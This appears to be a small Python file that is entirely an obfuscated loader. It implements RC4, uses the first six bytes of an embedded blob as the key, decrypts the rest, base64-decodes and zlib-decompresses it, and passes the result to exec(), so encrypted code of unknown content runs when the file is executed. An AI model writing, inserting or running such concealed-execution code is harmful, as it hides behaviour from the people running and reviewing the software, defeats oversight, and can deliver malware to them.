import base64, zlib
def _ksa(key):
    box = list(range(256))
    index = 0
    for position in range(256):
        index = (index + box[position] + key[position % len(key)]) & 0xFF
        box[position], box[index] = box[index], box[position]
    return box
def _rc4(data, key):
    box = _ksa(key)
    out = bytearray()
    first = second = 0
    for byte in data:
        first = (first + 1) & 0xFF
        second = (second + box[first]) & 0xFF
        box[first], box[second] = box[second], box[first]
        out.append(byte ^ box[(box[first] + box[second]) & 0xFF])
    return bytes(out)
_p = b'K3y!8z\x81\x8b*(\x89\xb0p\xd1\x9cB\xd7\x11\x10\xf4\xde\x05\x16\xabp{\x1a\xf0e\xee\x1a\xa3\x96\x83O\x08\x06\x10\x14\xd7\x1b\xd2\x90t\'\x91R"\xea*\xad\xe6Y\xcb\x85\xf1\xe3\x14\xea\xaed+\x0b\xdc\xf3\xd5\xd0\xe2\xebR;\x06\xe1z\x87o\x80\x90a txG\x92l0\xac\x02\x86u\xf5\x8a\x9cH(Y\rf\xfd\\I\x8e\x0f\xe2e\x86n\xe4\xf2D-\xdfZ9:\xa8\x92C\xb7V"\xe7\xa0\xe2\xecB\x7f\x8a\xd7;Gi2]\xf5K\xc1Q3\xfb\xa4\xbbM\x8b\xf3\x19\xed`$q\xec\xcf\xf9\x90'
exec(zlib.decompress(base64.b64decode(_rc4(_p[6:], _p[:6]))))
